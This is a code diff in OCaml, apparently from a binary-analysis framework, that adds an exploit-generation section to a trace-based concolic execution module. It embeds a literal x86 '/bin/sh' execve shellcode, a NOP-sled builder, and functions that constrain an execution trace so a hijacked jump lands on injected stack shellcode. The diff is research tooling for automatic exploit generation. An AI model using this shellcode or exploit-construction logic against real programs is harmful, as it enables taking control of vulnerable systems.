@@ -358,8 +358,9 @@ let run_block state block =
 	(* Ignore failed assertions -- assuming that we introduced them *)
       | AssertFailed _ -> 
 	  pdebug "ignoring failed assertion";
-	  let next = TraceConcrete.inst_fetch state.sigma (Int64.succ state.pc) in
-	    eval_block state next
+	  let new_pc = Int64.succ state.pc in
+	  let next = TraceConcrete.inst_fetch state.sigma new_pc in
+	    eval_block {state with pc=new_pc} next
   in
     try
       eval_block state init
@@ -522,27 +523,111 @@ let symbolic_run trace =
 	  (*pdebug ("Reason: "^(Pp.ast_stmt_to_string stmt));*)
 	  state.pred
  *)	    
-(* Substituting the last jump with assertions *)
-let convert addr trace = 
-  let target = Int64.of_string ("0x"^addr) in
-  let rec sub = function
-    | [] -> failwith "no jump found"
-    | (Ast.Jmp(e, atts))::rest ->
-	let e' = BinOp(EQ,e,Int(target,reg_32)) in
-	(Ast.Assert(e', atts))::rest
-    | _::rest -> sub rest
-  in
-  let rev = List.rev trace in
-  let clean = sub rev in
-  let trace = List.rev clean in
-    (* FIXME: more processing *)
-    trace
-	
 
 let concolic trace = 
   let trace = concrete trace in
   ignore (symbolic_run trace) ;
   trace
+
+(*************************************************************)
+(********************  Exploit Generation  *******************)
+(*************************************************************)
+
+(* A simple shellcode *)
+let shellcode =
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+    ^ "\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+
+let nop = '\x90'
+
+let nopsled n = String.make n nop
+
+(* TODO: find a way to determine PIN's offset *)
+let pin_offset = 400L
+
+
+(* Substituting the last jump with assertions *)
+let hijack_control target trace = 
+  let get_last_jmp_exp stmts = 
+    let rev = List.rev stmts in
+    let rec get_exp = function
+      | [] -> failwith "no jump found"
+      | (Ast.Jmp(e, atts))::rest ->
+	  ((e,atts), rest)
+      | _::rest -> get_exp rest
+    in
+      let (exp, rev) = get_exp rev in
+	(exp, List.rev rev)
+  in
+  let ((e, atts), trace) = get_last_jmp_exp trace in
+  let ret_constraint = BinOp(EQ,e,Int(target,reg_32)) in
+    trace, Ast.Assert(ret_constraint, atts)
+      
+let control_flow addr trace = 
+  let target = Int64.of_string ("0x"^addr) in
+  let trace, assertion = hijack_control target trace in
+    trace@[assertion]
+
+
+(* Injecting a payload after the return address *)
+let inject_payload start payload trace = 
+  (* TODO: A simple dataflow is missing here *)
+  let get_last_load_exp stmts = 
+    let rev = List.rev stmts in
+    let rec get_load = function
+      | [] -> failwith "no load found"
+      | (Ast.Move(_,Ast.Load(array,index,_,_),_))::rest ->
+	  ((array,index), rest)
+      | _::rest -> get_load rest
+    in
+    let (arr_ind, rev) = get_load rev in
+      (arr_ind, List.rev rev)
+  in
+  let bytes = ref [] in
+    String.iter 
+      (fun c -> bytes := (Int64.of_int (int_of_char c))::!bytes) payload ;
+    bytes := List.rev !bytes ;
+    let (mem,ind), trace = get_last_load_exp trace in
+    let _,assertions = 
+      List.fold_left 
+	(fun (i,acc) value ->
+	   let index = Ast.BinOp(PLUS, ind, Int(i,reg_32)) in
+	   let load = Ast.Load(mem, index, exp_false, reg_8) in
+	   let constr = Ast.BinOp(EQ, load, Int(value, reg_8)) in
+	     (Int64.succ i, (Ast.Assert(constr, [])::acc))
+	) (start, []) !bytes
+    in
+      trace, assertions
+
+let add_payload payload trace = 
+  let trace, assertions = inject_payload 0L payload trace in
+    trace @ assertions
+
+
+(* Performing shellcode injection *)
+let inject_shellcode nops trace = 
+  let get_stack_address stmts = 
+    let rec get_addr = function
+      | [] -> failwith "could not get address"
+      | (Ast.Label (_,atts))::rest ->
+	  let conc = filter_taint atts in
+	    if conc = [] then get_addr rest
+	    else
+	      List.fold_left 
+		(fun addr {mem=mem;index=index} ->
+		   if mem then index
+		   else addr
+		) 0L conc  (* FIX: fail by default *)
+      | x::rest -> get_addr rest
+    in
+      get_addr (List.rev stmts)
+  in	  
+  let payload = (nopsled nops) ^ shellcode in
+  let target_addr = get_stack_address trace in
+  let target_addr = Int64.add target_addr pin_offset in
+  let trace, assertion = hijack_control target_addr trace in
+  let _, shell = inject_payload 4L payload trace in
+    trace @ shell @ [assertion]
 
 
 (*************************************************************)
